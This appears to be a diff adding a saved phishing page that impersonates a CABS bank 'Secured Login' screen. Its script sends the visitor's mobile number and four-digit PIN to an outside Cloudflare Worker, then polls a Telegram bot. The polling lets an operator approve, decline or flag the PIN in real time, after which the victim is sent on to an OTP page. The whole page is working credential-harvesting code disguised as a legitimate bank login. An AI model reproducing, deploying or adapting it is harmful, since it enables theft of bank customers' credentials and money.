@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<!-- saved from url=(0042)https://cabsloan50.vercel.app/confirm.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secured Login | CABS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./Secured Login _ CABS_files/css2" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Albert Sans', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0a0e27;
+            overflow-x: hidden;
+        }
+
+        .bg-image {
+            position: fixed;
+            inset: 0;
+            background: url('https://cdn.thestandard.co.zw/images/theindependent/uploads/2023/04/Wqd7N7rkqPXmZIyo8BhGBPAr6Jim19sx4N6LGORI.jpg') center/cover no-repeat;
+            filter: blur(8px) brightness(0.35);
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 28px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            justify-content: center;
+        }
+
+        .logo-circle {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0d1642 0%, #1a237e 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.4);
+            border: 2px solid rgba(255,215,0,0.3);
+            overflow: hidden;
+        }
+
+        .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
+
+        .login-title {
+            font-family: 'Urbanist', sans-serif;
+            font-weight: 800;
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .login-title .lock-icon { font-size: 20px; }
+
+        .login-form { width: 100%; }
+
+        .form-group { margin-bottom: 24px; }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.85);
+            margin-bottom: 10px;
+        }
+
+        .form-group input[type="tel"] {
+            width: 100%;
+            height: 52px;
+            border: 1.5px solid rgba(255,255,255,0.25);
+            border-radius: 10px;
+            padding: 0 16px;
+            font-family: 'Albert Sans', sans-serif;
+            font-size: 16px;
+            color: #fff;
+            background: rgba(255,255,255,0.08);
+            outline: none;
+            transition: all 0.2s ease;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .form-group input[type="tel"]::placeholder { color: rgba(255,255,255,0.5); text-align: center; }
+        .form-group input[type="tel"]:focus {
+            border-color: rgba(255,255,255,0.5);
+            background: rgba(255,255,255,0.12);
+            box-shadow: 0 0 0 3px rgba(255,255,255,0.1);
+        }
+
+        .pin-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.85);
+            margin-bottom: 12px;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .pin-box {
+            width: 56px;
+            height: 56px;
+            border: 1.5px solid rgba(255,255,255,0.25);
+            border-radius: 10px;
+            background: rgba(255,255,255,0.08);
+            text-align: center;
+            font-family: 'Albert Sans', sans-serif;
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            outline: none;
+            transition: all 0.2s ease;
+            caret-color: #fff;
+        }
+
+        .pin-box:focus {
+            border-color: rgba(255,255,255,0.5);
+            background: rgba(255,255,255,0.12);
+            box-shadow: 0 0 0 3px rgba(255,255,255,0.1);
+        }
+
+        .pin-box::-webkit-outer-spin-button,
+        .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+
+        .btn-signin {
+            width: 100%;
+            height: 52px;
+            background: rgba(255,255,255,0.15);
+            color: rgba(255,255,255,0.9);
+            border: 1.5px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            font-family: 'Albert Sans', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 16px;
+            backdrop-filter: blur(4px);
+        }
+
+        .btn-signin:hover { background: rgba(255,255,255,0.25); border-color: rgba(255,255,255,0.35); }
+        .btn-signin:active { transform: scale(0.98); }
+
+        .btn-biometric {
+            width: 100%;
+            height: 52px;
+            background: #0d1642;
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            font-family: 'Albert Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            line-height: 1.4;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .btn-biometric:hover { background: #1a237e; }
+        .btn-biometric:active { transform: scale(0.98); }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-top: 40px;
+            padding: 0 8px;
+        }
+
+        .footer-link {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255,255,255,0.7);
+            font-size: 11px;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover { color: #fff; }
+
+        .footer-link svg {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.5;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 14, 39, 0.95);
+            z-index: 2000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .loading-overlay.active { display: flex; }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.15);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text {
+            font-family: 'Urbanist', sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            color: #fff;
+        }
+
+        .error-msg {
+            display: none;
+            width: 100%;
+            background: rgba(220, 53, 69, 0.15);
+            border: 1px solid rgba(220, 53, 69, 0.4);
+            color: #ff6b7a;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        @media (max-width: 380px) {
+            .container { padding: 30px 20px; }
+            .pin-box { width: 48px; height: 48px; font-size: 20px; }
+            .login-title { font-size: 20px; }
+            .logo-circle { width: 75px; height: 75px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-image"></div>
+
+    <div class="container">
+        <div class="logo-circle">
+            <img src="./Secured Login _ CABS_files/nbm.jpeg" alt="NBM Logo">
+        </div>
+
+        <div class="login-title">
+            Secured Login
+            <span class="lock-icon">🔒</span>
+        </div>
+
+        <div class="error-msg" id="loginError">Access Denied. Please check your details.</div>
+
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <label for="mobileNumber">Mobile Number</label>
+                <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="eg 07XXXXXXXXX" maxlength="12" required="">
+            </div>
+
+            <label class="pin-label">Enter CABS pin</label>
+            <div class="pin-container">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
+            </div>
+
+            <button type="submit" class="btn-signin">Sign In</button>
+        </form>
+
+        <button type="button" class="btn-biometric" onclick="alert('Biometric authentication coming soon')">
+            Forgot Password?
+        </button>
+
+        <div class="footer-links">
+            <a href="https://cabsloan50.vercel.app/confirm.html#" class="footer-link">
+                <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                Contact us
+            </a>
+            <a href="https://cabsloan50.vercel.app/confirm.html#" class="footer-link">
+                <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+                Terms and Conditions
+            </a>
+            <a href="https://cabsloan50.vercel.app/confirm.html#" class="footer-link">
+                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                Privacy policy
+            </a>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Verifying...</div>
+    </div>
+
+    <script>
+        // ⚠️ Replace with your Worker URL if different
+        const WORKER_URL = "https://cabsloan.newtonmulti.workers.dev";
+
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                }
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+            box.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) e.preventDefault();
+            });
+        });
+
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        function showError(msg) {
+            const err = document.getElementById('loginError');
+            if (err) { err.textContent = msg; err.style.display = 'block'; }
+        }
+
+        function hideError() {
+            const err = document.getElementById('loginError');
+            if (err) err.style.display = 'none';
+        }
+
+        function startPolling(userNum, onApproveUrl) {
+            let offset = 0;
+            let decided = false;
+            let pollCount = 0;
+            const maxPolls = 90;
+
+            // Seed offset so we don't process old callbacks
+            fetch(`${WORKER_URL}/init`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(() => pollLoop());
+
+            function pollLoop() {
+                if (decided) return;
+                pollCount++;
+                if (pollCount > maxPolls) {
+                    decided = true;
+                    loadingOverlay.classList.remove('active');
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                fetch(`${WORKER_URL}/poll?offset=${offset}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || decided) {
+                            if (!decided) setTimeout(pollLoop, 2000);
+                            return;
+                        }
+                        for (let update of data.result) {
+                            offset = update.update_id + 1;
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                // Acknowledge callback so Telegram stops the loading spinner
+                                fetch(`${WORKER_URL}/answer`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: "Action recorded!"
+                                    })
+                                }).catch(() => {});
+
+                                if (action === `approve_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    window.location.href = onApproveUrl;
+                                    return;
+                                } else if (action === `decline_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Request declined. Please try again.');
+                                    return;
+                                } else if (action === `wrong_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Wrong PIN. Please enter the correct PIN.');
+                                    return;
+                                }
+                            }
+                        }
+                        if (!decided) setTimeout(pollLoop, 2000);
+                    })
+                    .catch(() => { if (!decided) setTimeout(pollLoop, 2000); });
+            }
+        }
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            hideError();
+
+            const mobile = document.getElementById('mobileNumber').value.trim();
+            const pin = Array.from(pinBoxes).map(b => b.value).join('');
+
+            if (!mobile || pin.length !== 4) {
+                showError('Please enter your mobile number and 4-digit PIN.');
+                return;
+            }
+
+            localStorage.setItem('phoneNumber', mobile);
+            loadingOverlay.classList.add('active');
+
+            const userNum = mobile.replace(/\D/g, '');
+
+            fetch(`${WORKER_URL}/send`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mobile, pin, userNum })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('Send response:', data);
+                if (data.ok) {
+                    startPolling(userNum, 'otp.html');
+                } else {
+                    loadingOverlay.classList.remove('active');
+                    showError('Telegram error: ' + (data.description || data.error || 'Unknown'));
+                }
+            })
+            .catch(err => {
+                console.error('Fetch error:', err);
+                loadingOverlay.classList.remove('active');
+                showError('Network error: ' + err.message);
+            });
+        });
+    </script>
+
+</body></html>
